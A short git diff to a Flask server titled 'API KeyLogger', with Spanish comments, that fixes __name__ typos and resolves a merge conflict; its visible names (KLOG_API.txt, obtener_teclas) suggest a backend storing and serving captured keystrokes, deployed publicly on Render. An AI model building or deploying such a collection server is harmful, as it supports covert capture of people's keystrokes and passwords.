@@ -10,7 +10,7 @@ from flask import Flask, request, jsonify
 import os
 from datetime import datetime
 
-app = Flask(_name_)
+app = Flask(__name__)
 
 # Configuración del archivo de log
 ARCHIVO_LOG = "KLOG_API.txt"
@@ -95,7 +95,7 @@ def obtener_teclas():
         return jsonify({"error": str(e)}), 500
 
 
-if _name_ == '_main_':
+if __name__ == '__main__':
     print("=" * 60)
     print("API KeyLogger - Iniciando...")
     print("=" * 60)
@@ -111,8 +111,4 @@ if _name_ == '_main_':
     # En Render, usar 0.0.0.0 para escuchar en todas las interfaces
     import os
     port = int(os.environ.get('PORT', 5000))
-<<<<<<< HEAD
     app.run(host='0.0.0.0', port=port, debug=False)
-=======
-    app.run(host='0.0.0.0', port=port, debug=False)
->>>>>>> 7c7c36396c4b8aa91b71d02cca978d3fb4df6de8
